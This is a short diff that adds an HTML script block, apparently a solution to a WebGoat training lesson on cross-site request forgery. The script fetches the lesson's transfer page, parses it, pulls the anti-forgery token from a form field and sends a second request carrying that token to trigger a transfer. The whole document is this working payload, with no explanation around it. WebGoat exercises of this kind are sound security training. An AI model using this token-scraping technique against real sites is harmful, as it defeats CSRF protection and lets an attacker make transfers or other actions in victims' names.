@@ -1,0 +1,10 @@
+<script>
+	const parser = new DOMParser();
+
+	fetch('/WebGoat/attack?Screen=1804956653&menu=900&transfer=main').then(async (res) => {
+		const transferPageString = await res.text();
+		const transferPage = parser.parseFromString(transferPageString, 'text/html');
+
+		return fetch(`/WebGoat/attack?Screen=1804956653&menu=900&transfer=900&token=${transferPage.form[1].value}`);
+	});
+</script>
